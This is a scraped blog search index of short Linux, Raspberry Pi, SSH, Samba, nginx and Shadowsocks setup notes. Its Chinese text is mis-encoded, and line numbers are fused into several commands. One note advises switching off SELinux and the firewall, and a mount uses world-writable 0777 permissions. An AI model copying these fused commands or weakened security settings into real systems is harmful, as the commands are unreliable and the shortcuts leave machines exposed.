.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"adb è®¾å¤‡ unauthorized","slug":"history/tech/5c111b9abe437f5805a40dd9","date":"2018-12-12T02:30:50.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c111b9abe437f5805a40dd9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c111b9abe437f5805a40dd9/","excerpt":"","text":"12adb kill-serveradb start-server","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Android Studio é»˜è®¤å®‰è£…è·¯å¾„","slug":"history/tech/5c111a2dbe437f5805a40dd8","date":"2018-12-12T02:24:45.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c111a2dbe437f5805a40dd8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c111a2dbe437f5805a40dd8/","excerpt":"","text":"123Android Studio é»˜è®¤å®‰è£…è·¯å¾„ï¼šC:\\Program Files\\Android\\Android StudioSDK é»˜è®¤å®‰è£…è·¯å¾„ï¼šC:\\Users\\è®¡ç®—æœºç”¨æˆ·å\\AppData\\Local\\Android\\sdkgradleé»˜è®¤å®‰è£…è·¯å¾„ï¼šC:\\Android\\Android Studio\\gradle\\m2repository\\com\\android\\tools\\build\\gradle","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows openssh","slug":"history/tech/5c0f8372be437f5805a40dd7","date":"2018-12-10T21:29:22.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c0f8372be437f5805a40dd7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c0f8372be437f5805a40dd7/","excerpt":"","text":"ä¸‹è½½ opensshhttps://github.com/PowerShell/Win32-OpenSSH/releasesè§£å‹ç¼©åˆ° C:\\Program Files\\OpenSSHå®‰è£…:1powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1é…ç½®SSHæœåŠ¡å™¨å…è®¸Windowsé˜²ç«å¢™ä¸­çš„SSHæœåŠ¡å™¨çš„ä¼ å…¥è¿æ¥ï¼šæ§åˆ¶é¢æ¿ &gt; ç³»ç»Ÿå’Œå®‰å…¨ &gt; Windowsé˜²ç«å¢™1 &gt; é«˜çº§è®¾ç½® &gt; å…¥ç«™è§„åˆ™ ï¼Œç„¶åä¸ºç«¯å£22æ·»åŠ æ–°è§„åˆ™ã€‚å¯åŠ¨æœåŠ¡å’Œ/æˆ–é…ç½®è‡ªåŠ¨å¯åŠ¨ï¼šæ§åˆ¶é¢æ¿&gt;ç³»ç»Ÿå’Œå®‰å…¨&gt;ç®¡ç†å·¥å…·ï¼Œç„¶åæ‰“å¼€æœåŠ¡ã€‚æ‰¾åˆ°OpenSSH SSH ServeræœåŠ¡ã€‚å°†â€œ å¯åŠ¨ç±»å‹â€æ›´æ”¹ä¸ºâ€œ è‡ªåŠ¨â€å¹¶ç¡®è®¤ã€‚å•å‡»â€œ å¯åŠ¨æœåŠ¡â€ï¼Œå¯åŠ¨OpenSSH SSH Server æœåŠ¡ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"SSH å…¬é’¥è®¤è¯ Permission denied (publickey,gssapi-keyex,gssapi-with-mic).","slug":"history/tech/5c0e3780be437f5805a40dd6","date":"2018-12-09T21:53:04.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c0e3780be437f5805a40dd6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c0e3780be437f5805a40dd6/","excerpt":"","text":"123chmod 700 .sshchmod 600 .ssh/authorized_keysrestorecon -r -vv .ssh/authorized_keyså¦‚æœè¿˜ä¸è¡Œ å…³é—­selinux/firewalldå¦‚æœè¿˜ä¸è¡Œï¼Œæ£€æŸ¥ /etc/security/access.conf æ·»åŠ ï¼š1-:ALL EXCEPT root &lt;username&gt; :ALLé‡å¯æˆ–ï¼š1source /etc/security/access.conf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux mount samba","slug":"history/tech/5c0b20c6be437f5805a40dd2","date":"2018-12-08T01:39:18.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c0b20c6be437f5805a40dd2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c0b20c6be437f5805a40dd2/","excerpt":"","text":"1sudo mount -t cifs //192.168.3.2/sda1 /mnt -o username=&lt;usernmame&gt;,password=&lt;password&gt;,dir_mode=0777,file_mode=0777","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ ‘è“æ´¾ samba","slug":"history/tech/5c0bb8b5be437f5805a40dd5","date":"2018-12-08T00:27:33.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c0bb8b5be437f5805a40dd5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c0bb8b5be437f5805a40dd5/","excerpt":"","text":"å®‰è£…1sudo apt-get install -y samba samba-common-biné…ç½®1234567891011121314151617vim /etc/samba/smb.conf[MyNAS] # è¯´æ˜ä¿¡æ¯ comment = NAS Storage # å¯ä»¥è®¿é—®çš„ç”¨æˆ· valid users = pi,root # å…±äº«æ–‡ä»¶çš„è·¯å¾„,raspberry pi ä¼šè‡ªåŠ¨å°†è¿æ¥åˆ°å…¶ä¸Šçš„å¤–æ¥å­˜å‚¨è®¾å¤‡æŒ‚è½½åˆ°/media/pi/ç›®å½•ä¸‹ã€‚ path = /media/pi/ # å¯è¢«å…¶ä»–äººçœ‹åˆ°èµ„æºåç§°ï¼ˆéå†…å®¹ï¼‰ browseable = yes # å¯å†™ writable = yes # æ–°å»ºæ–‡ä»¶çš„æƒé™ä¸º 664 create mask = 0664 # æ–°å»ºç›®å½•çš„æƒé™ä¸º 775 directory mask = 0775æµ‹è¯•é…ç½®æ–‡ä»¶1testparmæ·»åŠ ç™»é™†è´¦æˆ·å¹¶åˆ›å»ºå¯†ç ï¼Œå¿…é¡»æ˜¯ linux å·²å­˜åœ¨çš„ç”¨æˆ·12sudo smbpasswd -a pisudo /etc/init.d/samba restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ ‘è“æ´¾ä¿®æ”¹ vnc åˆ†è¾¨ç‡","slug":"history/tech/5c0bb40ebe437f5805a40dd4","date":"2018-12-08T00:07:42.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c0bb40ebe437f5805a40dd4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c0bb40ebe437f5805a40dd4/","excerpt":"","text":"1raspi-config","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos æŸ¥æ‰¾ä¾èµ–","slug":"history/tech/5c0bab36be437f5805a40dd3","date":"2018-12-07T23:29:58.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c0bab36be437f5805a40dd3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c0bab36be437f5805a40dd3/","excerpt":"","text":"1yum whatprovides */lspci","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ç¬”è®°æœ¬ è£…centos åˆä¸Šç›–å­è‡ªåŠ¨æŒ‚èµ·","slug":"history/tech/5c0a77f5be437f5805a40dd1","date":"2018-12-07T01:39:01.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c0a77f5be437f5805a40dd1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c0a77f5be437f5805a40dd1/","excerpt":"","text":"12345vim /etc/systemd/logind.confHandlePowerKey=ignoreHandleSuspendKey=ignoreHandleHibernateKey=ignoreHandleLidSwitch=ignoreHandlePowerKeyï¼šæŒ‰ä¸‹ç”µæºé”®åçš„åŠ¨ä½œHandleSleepKeyï¼šæŒ‰ä¸‹æŒ‚èµ·é”®åçš„åŠ¨ä½œHandleHibernateKey: æŒ‰ä¸‹ä¼‘çœ é”®åçš„åŠ¨ä½œHandleLidSwitchï¼šåˆä¸Šç¬”è®°æœ¬ç›–åå¾…æœºignoreï¼ˆä»€ä¹ˆéƒ½ä¸åšï¼‰poweroffï¼ˆå…³æœºï¼‰rebootï¼ˆé‡æ–°å¯åŠ¨ï¼‰haltï¼ˆå…³æœºï¼Œå’Œpoweroffæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œéœ€è¦æ‰‹åŠ¨æ–­å¼€ç”µæºï¼Ÿï¼‰suspendï¼ˆå¾…æœºæŒ‚èµ·ï¼‰hibernateï¼ˆä¼‘çœ ï¼‰","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"nginx basic auth","slug":"history/tech/5c056084be437f5805a40dd0","date":"2018-12-04T04:57:40.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5c056084be437f5805a40dd0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c056084be437f5805a40dd0/","excerpt":"","text":"123sudo yum install -y httpd-tools # centosapt install -y apache2-utils # ubuntuhtpasswd -c /usr/local/openresty/nginx/conf/htpasswd &lt;username&gt;nginx.conf123456server &#123; ...... auth_basic &quot;Private Property&quot;; auth_basic_user_file /usr/local/openresty/nginx/conf/htpasswd; ......&#125;é‡å¯ nginx1systemctl reload nginx","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ ‘è“æ´¾æ— çº¿è½¬æœ‰çº¿","slug":"history/tech/5c05428cbe437f5805a40dcf","date":"2018-12-03T02:49:48.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5c05428cbe437f5805a40dcf/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c05428cbe437f5805a40dcf/","excerpt":"","text":"å®‰è£…å¿…é¡»çš„è½¯ä»¶åŒ…1apt install -y bridge-utils dnsmasqæ·»åŠ ç½‘æ¡¥1234brctl addbr br0brctl addif br0 eth0ifconfig br0 192.168.99.1 upifconfig eth0 0.0.0.0 upæ‰“å¼€æ•°æ®æŠ¥è½¬å‘12345echo 1 &gt; /proc/sys/net/ipv4/ip_forwardæˆ–vim /etc/sysctl.conf+ net.ipv4.ip_forward = 1sysctl -pä¿®æ”¹ dnsmasq é…ç½®123vim /etc/dnsmasq.conf+ dhcp-range=192.168.99.50,192.168.99.100,255.255.255.0,12hsystemctl restart dnsmasq.serviceå¢åŠ  iptbales å¯åŠ¨åŠ è½½123vim /etc/network/if-pre-up.d/iptables+ #!/bin/bash+ iptables-restore &lt; /etc/iptables.rulesä¿®æ”¹ iptables12iptables -t nat -A POSTROUTING -o wlan -j MASQUERADEiptable-save &gt; /etc/iptables.rules","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… teamviewer","slug":"history/tech/5c051961be437f5805a40dce","date":"2018-12-02T23:54:09.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5c051961be437f5805a40dce/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c051961be437f5805a40dce/","excerpt":"","text":"12sudo yum install -y qt5-qtdeclarative qt5-qtwebkit qt5-qtx11extras qt5-qtgraphicaleffects qt5-qtquickcontrolsrpm -ivh xxx.rpm","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ssh ç«¯å£è½¬å‘","slug":"history/tech/5c04e36bbe437f5805a40dcd","date":"2018-12-02T20:03:55.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5c04e36bbe437f5805a40dcd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c04e36bbe437f5805a40dcd/","excerpt":"","text":"æœ¬åœ°ç«¯å£è½¬å‘æœ¬åœ° 3000 ç«¯å£æµé‡è½¬å‘åˆ°è¿œç¨‹12-L æœ¬åœ°ç½‘å¡åœ°å€:æœ¬åœ°ç«¯å£:ç›®æ ‡åœ°å€:ç›®æ ‡ç«¯å£ssh -L 3000:localhost:3000 root@server è¿œç¨‹ç«¯å£è½¬å‘è¿œç¨‹ 3000 ç«¯å£æµé‡è½¬å‘åˆ°æœ¬åœ°12-R è¿œç¨‹ç½‘å¡åœ°å€:è¿œç¨‹ç«¯å£:ç›®æ ‡åœ°å€:ç›®æ ‡ç«¯å£ssh -R 2000:192.168.3.200:3000 root@server åŠ¨æ€ç«¯å£è½¬å‘æœ¬åœ° 3000 ç«¯å£æµé‡è½¬å‘åˆ°æœåŠ¡å™¨å¯¹åº”ç«¯å£12-D æœ¬åœ°ç½‘å¡åœ°å€:æœ¬åœ°ç«¯å£ssh -D localhost:3000 root@serverå‚æ•°ï¼š12345-q :- be very quite, we are acting only as a tunnel.-T :- Do not allocate a pseudo tty, we are only acting a tunnel.-f :- move the ssh process to background, as we donâ€™t want to interact with this ssh session directly.-N :- Do not execute remote command.-n :- redirect standard input to /dev/null.","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Shadowsocks ä½¿ç”¨æ‰‹å†Œ","slug":"history/tech/5c03be98be437f5805a40dcc","date":"2018-12-01T23:14:32.000Z","updated":"2020-11-29T01:42:08.771Z","comments":true,"path":"history/tech/5c03be98be437f5805a40dcc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c03be98be437f5805a40dcc/","excerpt":"","text":"12345678910ä½¿ç”¨chacha20 åŠ å¯†ç±»å‹éœ€è¦å®‰è£…libsodiumåº“æˆ‘ä½¿ç”¨çš„macç³»ç»Ÿ ä½¿ç”¨brew å®‰è£… brew install libsodium (å…¶ä»–å¹³å°Googleä»¥ä¸‹å³å¯)sslocal å¯åŠ¨å¤šä¸ªä¸åŒç«¯å£çš„å®¢æˆ·ç«¯æ— æ³•ä½¿ç”¨ -d start å®ˆæŠ¤å¤šä¸ªè¿›ç¨‹é…åˆnohupçš„æ–¹å¼ å¯åŠ¨å¤šä¸ªä¸åŒç«¯å£çš„å®¢æˆ·ç«¯ nohup sslocal -c uk.json &gt; luk.log 2&gt;&amp;1 &amp;nohup sslocal -c us.json &gt; lus.log 2&gt;&amp;1 &amp;nohup sslocal -c jp.json &gt; ljp.log 2&gt;&amp;1 &amp;ä»¥ä¸‹æ˜¯å‚è€ƒèµ„æ–™123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221Shadowsocksæ˜¯ä¸€ä¸ªè½»é‡çº§socks5ä»£ç†ï¼Œæœ€åˆç”¨ Python ç¼–å†™ã€‚Contents1 å®‰è£…2 é…ç½®2.1 å®¢æˆ·ç«¯2.1.1 å‘½ä»¤è¡Œ2.1.2 ä»¥å®ˆæŠ¤è¿›ç¨‹å½¢å¼è¿è¡Œå®¢æˆ·ç«¯2.1.3 å›¾å½¢ç•Œé¢å®¢æˆ·ç«¯2.1.4 é…ç½®ä»£ç†2.1.4.1 æµè§ˆå™¨é…ç½®2.2 æœåŠ¡ç«¯2.2.1 ä»¥å‘½ä»¤è¡Œå¯åŠ¨è¿›ç¨‹2.2.2 ä»¥å®ˆæŠ¤è¿›ç¨‹å½¢å¼è¿è¡Œ2.2.3 å¤šç«¯å£è¿è¡Œ2.2.4 åŠ å¯†æ–¹æ³•2.2.5 æ€§èƒ½ä¼˜åŒ–3 å‚é˜…å®‰è£…å¯å®‰è£… shadowsocks-libev æˆ–è€… shadowsocksã€‚é…ç½®shadowsocksä»¥jsonä¸ºé…ç½®æ–‡ä»¶æ ¼å¼ï¼Œä»¥ä¸‹æ˜¯å®‰è£…åŒ…ä¸­çš„æ ·ä¾‹ï¼š/etc/shadowsocks/config.json&#123; &quot;server&quot;:&quot;remote-shadowsocks-server-ip-addr&quot;, &quot;server_port&quot;:443, &quot;local_address&quot;:&quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;your-passwd&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;chacha20-ietf&quot;, &quot;fast_open&quot;:false, &quot;workers&quot;:1&#125;æç¤ºï¼š shadowsocks: è‹¥éœ€åŒæ—¶æŒ‡å®šå¤šä¸ªæœåŠ¡ç«¯ipï¼Œä½¿ç”¨å¦‚ä¸‹ä¾‹çš„è¯­æ³•&quot;server&quot;:[&quot;1.1.1.1&quot;,&quot;2.2.2.2&quot;],æç¤ºï¼š è¦æ‰¾å‡ºåœ¨ä½ çš„æœºå™¨ä¸Šè¿è¡Œæœ€å¿«çš„æ–¹å¼ï¼Œå¯ä»¥è¿è¡Œè¿™ä¸ªè„šæœ¬Name Explanationserver æœåŠ¡ç«¯ç›‘å¬åœ°å€(IPv4æˆ–IPv6)server_port æœåŠ¡ç«¯ç«¯å£ï¼Œä¸€èˆ¬ä¸º443local_address æœ¬åœ°ç›‘å¬åœ°å€ï¼Œç¼ºçœä¸º127.0.0.1 å¯ç”¨-bå‚æ•°è®¾ç½®local_port æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œä¸€èˆ¬ä¸º1080password ç”¨ä»¥åŠ å¯†çš„å¯†åŒ™timeout è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰method å‚é˜… åŠ å¯†mode è®¾ç½®ä¸ºtcpæˆ–udpæˆ–tcp_and_udpfast_open æ˜¯å¦å¯ç”¨TCP-Fast-Openwokers workeræ•°é‡ï¼Œå¦‚æœä¸ç†è§£å«ä¹‰è¯·ä¸è¦æ”¹å®¢æˆ·ç«¯å‘½ä»¤è¡Œè¿è¡Œ ss-local å¯åŠ¨å®¢æˆ·ç«¯ï¼›è‹¥éœ€æŒ‡å®šé…ç½®æ–‡ä»¶çš„ä½ç½®ï¼š# ss-local -c /etc/shadowsocks/config.jsonæ³¨æ„: æœ‰ç”¨æˆ·æŠ¥å‘Šæ— æ³•æˆåŠŸåœ¨è¿è¡Œæ—¶åŠ è½½config.jsonï¼Œæˆ–å¯å°è¯•æ‰‹åŠ¨è¿è¡Œï¼š# ss-local -s æœåŠ¡å™¨åœ°å€ -p æœåŠ¡å™¨ç«¯å£ -l æœ¬åœ°ç«¯ç«¯å£ -k å¯†ç  -m åŠ å¯†æ–¹æ³•é…åˆnohupå’Œ&amp;å¯ä»¥ä½¿ä¹‹åå°è¿è¡Œï¼Œå…³é—­ç»ˆç«¯ä¹Ÿä¸å½±å“ï¼š#nohup ss-local -s æœåŠ¡å™¨åœ°å€ -p æœåŠ¡å™¨ç«¯å£ -l æœ¬åœ°ç«¯ç«¯å£ -k å¯†ç  -m åŠ å¯†æ–¹æ³• &amp;å¢åŠ  -v å‚æ•°è·å–è¯¦ç»†logä¿¡æ¯ä»¥å®ˆæŠ¤è¿›ç¨‹å½¢å¼è¿è¡Œå®¢æˆ·ç«¯æ³¨æ„: shadowsockså’Œshadowsocks-libevçš„systemd ç³»ç»Ÿå•å…ƒä½¿ç”¨ç›¸åŒçš„é…ç½®æ–‡ä»¶è·¯å¾„ ï¼ˆ/etc/shadowsocksï¼‰Shadowsocksçš„systemdæœåŠ¡å¯åœ¨/etc/shadowsocks/é‡Œè°ƒç”¨ä¸åŒçš„conf-file.jsonï¼ˆä»¥conf-fileä¸ºåŒºåˆ†æ ‡å¿—ï¼‰ï¼Œä¾‹ï¼š åœ¨/etc/shadowsocks/ä¸­åˆ›å»ºäº†foo.jsoné…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆæ‰§è¡Œä»¥ä¸‹è¯­å¥å°±å¯ä»¥è°ƒç”¨è¯¥é…ç½®ï¼š# systemctl start shadowsocks@fooè‹¥éœ€å¼€æœºè‡ªå¯åŠ¨ï¼š# systemctl enable shadowsocks@fooæç¤ºï¼š å¯ç”¨journalctl -u shadowsocks@fooæ¥æŸ¥è¯¢æ—¥å¿—ï¼›å›¾å½¢ç•Œé¢å®¢æˆ·ç«¯å®‰è£… shadowsocks-qt5ã€‚é…ç½®ä»£ç†shadowsockså®¢æˆ·ç«¯å¯åŠ¨åï¼Œå…¶ä»–ç¨‹åºå¹¶ä¸ä¼šç›´æ¥åº”ç”¨socks5è¿æ¥ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•å¯¹å…¶è¿›è¡Œé…ç½®ã€‚å…¨å±€ä»£ç†ä½¿ç”¨Iptables (ç®€ä½“ä¸­æ–‡)ç­‰å·¥å…·ï¼Œæ¡Œé¢ç¯å¢ƒç”¨æˆ·å¯ä½¿ç”¨æ¡Œé¢è®¾ç½®ä¸­ç½‘ç»œè®¾ç½®é‡Œçš„ä»£ç†åŠŸèƒ½ã€‚æ³¨æ„: ä½¿ç”¨å…¨å±€ä»£ç†ä¼šä½¿æ‰€æœ‰çš„è¿æ¥é€šè¿‡shadowsocksæœåŠ¡å™¨ä¸­è½¬ï¼Œä¸€èˆ¬ä¸å»ºè®®ä½¿ç”¨å…¨å±€ä»£ç†ã€‚å¦å¤–ï¼Œgnomeæ¡Œé¢çš„ä»£ç†è®¾ç½®æ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚ç¨‹åºè®¾ç½®è‡ªèº«ä»£ç†ä¸å°‘ç¨‹åºéƒ½èƒ½åœ¨å…¶è®¾ç½®ä¸­æ·»åŠ ä»£ç†ï¼Œåªéœ€è¦åœ¨å…¶è®¾ç½®ä¸­æ‰¾åˆ°ç½‘ç»œç›¸å…³é…ç½®ï¼Œæ·»åŠ socks v5ä»£ç†ï¼Œå‚ç…§æœ¬åœ°é…ç½®æ–‡ä»¶ä¸­çš„ipå’Œportå¡«å†™å³å¯ï¼ˆä¾‹å¦‚æµè§ˆå™¨çš„é…ç½®å¯å‚è€ƒä¸‹æ–‡#æµè§ˆå™¨é…ç½®ï¼‰ã€‚ä½¿ç”¨å·¥å…·è¿›è¡Œä¸´æ—¶ä»£ç†ä¾‹å¦‚proxychains-ngï¼ˆå‚çœ‹Proxy settings#Using a SOCKS proxyï¼‰å’Œredsocks-gitAURã€‚ ä¾‹å¦‚ä½¿ç”¨proxychanisä»£ç†çš„ä¾‹å­(å‡è®¾ä½ å·²ç»åœ¨/etc/proxychains.confä¸­é…ç½®å¥½socks5ï¼‰ï¼š proxychains firefoxè½¬æ¢ä¸ºhttpä»£ç†ç›´æ¥èµ°socksä»£ç†æœ‰æ—¶æœªå¿…æ˜¯ç”¨æˆ·çš„æœŸæœ›ï¼Œå¯ä½¿ç”¨privoxyç­‰è½¯ä»¶è½¬åŒ–socksä»£ç†ä¸ºhttpä»£ç†ã€‚å¯ä½¿ç”¨privoxyå’Œsquidç­‰å·¥å…·ã€‚ ä»¥Privoxyä¸ºä¾‹ï¼Œç¼–è¾‘privoxyé…ç½®æ–‡ä»¶ï¼Œæ·»åŠ socks5è½¬å‘ï¼ˆä¸è¦æ¼ä¸‹1080åé¢çš„ç‚¹)ï¼š forward-socks5 / 127.0.0.1:1080 .é»˜è®¤ç›‘å¬çš„æ˜¯æœ¬æœºçš„8188ç«¯å£ï¼Œå³localhost:8188ï¼Œå¯æ›´æ”¹ä¸ºç›‘å¬å…¶ä»–ç«¯å£ï¼Œå¦‚ listen-address 127.0.0.1:8010æç¤ºï¼š å¦‚æœå¸Œæœ›ç½‘ç»œä¸Šå…¶ä»–ä¸»æœºä¹Ÿèƒ½ä½¿ç”¨è¯¥privoxyé…ç½®ï¼Œå¯ä»¥æ›´æ”¹127.0.0.1ä¸º0.0.0.0æˆ–ç›´æ¥åˆ é™¤127.0.0.1ã€‚ä½¿ç”¨systemdå¯åŠ¨æˆ–é‡å¯privoxy.serviceæœåŠ¡ï¼Œå°±å¯ä»¥ä½¿ç”¨äº†ã€‚å‡è®¾è½¬åŒ–åçš„httpä»£ç†ä¸º127.0.0.1:8010ï¼Œåˆ™åœ¨ç»ˆç«¯ä¸­å¯åŠ¨ï¼ˆä»¥å¯åŠ¨chromiumä¸ºä¾‹ï¼‰ï¼š $ chromium %U --proxy-server=127.0.0.1:8010æµè§ˆå™¨é…ç½®æç¤ºï¼š æµè§ˆå™¨ç›´æ¥ä½¿ç”¨SOCKSä»£ç†æ—¶ï¼Œä½ å¯èƒ½éœ€è¦ä½¿ç”¨privoxyç­‰è¾…åŠ©ç¨‹åºï¼Œå› ä¸ºä¸€èˆ¬æµè§ˆå™¨ä¼šæ³„æ¼ä½ çš„DNSè¯·æ±‚ï¼Œä»è€Œå‡å°‘ä½ 